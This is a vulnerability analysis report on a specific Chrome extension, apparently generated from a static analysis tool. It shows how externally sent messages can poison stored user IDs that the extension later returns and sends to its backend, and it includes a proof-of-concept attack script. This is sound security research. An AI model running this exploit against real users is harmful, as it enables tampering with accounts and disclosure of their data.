# CoCo Analysis: ealpicjfmdaopfehcplgmghbbepcejli

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both part of the same vulnerability)

---

## Sink 1 & 2: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (Complete Storage Exploitation Chain)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ealpicjfmdaopfehcplgmghbbepcejli/opgen_generated_files/bg.js
Line 999: chrome.storage.sync.set({ "user_id": request.user_id, "userName": request.userName }, function () {})
- Sink 1: request.user_id
- Sink 2: request.userName

**Code:**

```javascript
// Background script - External message handler (lines 998-1001)
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
  chrome.storage.sync.set({ "user_id": request.user_id, "userName": request.userName }, function () {
    // ← attacker-controlled data stored
  })
});

// Background script - Internal message handler that reads storage (lines 965-996)
chrome.runtime.onMessage.addListener(
  function (request, sender, sendResponse) {
    if (request.Message == "GiveId") {
      chrome.storage.sync.get(["user_id"], res => {
        fetch("https://gitteye.herokuapp.com/api/user/links", {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ "userId": res.user_id }), // ← poisoned data used
        }).then(
          resp => {
            resp.json().then(
              da => {
                sendResponse({ userId: res.user_id, userLinks: da.links }); // ← poisoned data sent back
              }
            )
          }
        )
        return true;
      })
    }
    else if (request.Message == "POPUP") {
      chrome.storage.sync.get(["user_id", "userName"], res => {
        sendResponse({ "userId": res.user_id, "userName": res.userName }) // ← poisoned data sent back
      })
    }
    return true;
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Step 1: From the whitelisted domain (gitteye.herokuapp.com), poison the storage
chrome.runtime.sendMessage(
  "ealpicjfmdaopfehcplgmghbbepcejli", // extension ID
  {
    user_id: "malicious_user_id",
    userName: "malicious_username"
  }
);

// Step 2: Trigger retrieval from any webpage where content script runs (github.com)
// Inject script on github.com:
chrome.runtime.sendMessage(
  { Message: "POPUP" },
  function(response) {
    console.log("Exfiltrated data:", response);
    // response.userId = "malicious_user_id"
    // response.userName = "malicious_username"
  }
);

// Alternative: Trigger GiveId flow which also uses poisoned user_id
chrome.runtime.sendMessage(
  { Message: "GiveId" },
  function(response) {
    console.log("User ID:", response.userId); // malicious_user_id
    console.log("Links:", response.userLinks);
  }
);
```

**Impact:** Complete storage exploitation chain. An attacker controlling the whitelisted domain (gitteye.herokuapp.com) can poison the chrome.storage.sync with arbitrary user_id and userName values. This poisoned data is then retrieved and sent back to the attacker through sendResponse when internal messages are sent. The attacker can also cause the extension to send the poisoned user_id to the backend server, potentially accessing or manipulating another user's data. This represents both information disclosure of the poisoned values and potential privilege escalation if the backend trusts the user_id parameter.
